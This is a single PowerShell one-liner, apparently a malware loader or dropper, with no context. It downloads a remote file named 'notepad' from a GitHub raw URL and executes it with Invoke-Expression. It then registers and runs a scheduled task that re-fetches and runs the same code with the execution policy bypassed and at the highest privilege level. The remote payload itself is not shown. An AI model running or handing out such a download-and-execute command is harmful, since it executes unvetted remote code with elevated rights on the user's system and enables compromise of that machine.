$script = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Lorcan84/test/main/notepad" -UseBasicParsing; Invoke-Expression $script.Content; schtasks /create /tn "MeinSkriptTask" /tr "powershell.exe -ExecutionPolicy Bypass -Command `$script = Invoke-WebRequest -Uri `\"https://raw.githubusercontent.com/Lorcan84/test/main/notepad`\" -UseBasicParsing; Invoke-Expression `$script.Content`" /sc once /st 00:00 /rl highest /f; schtasks /run /tn "MeinSkriptTask"
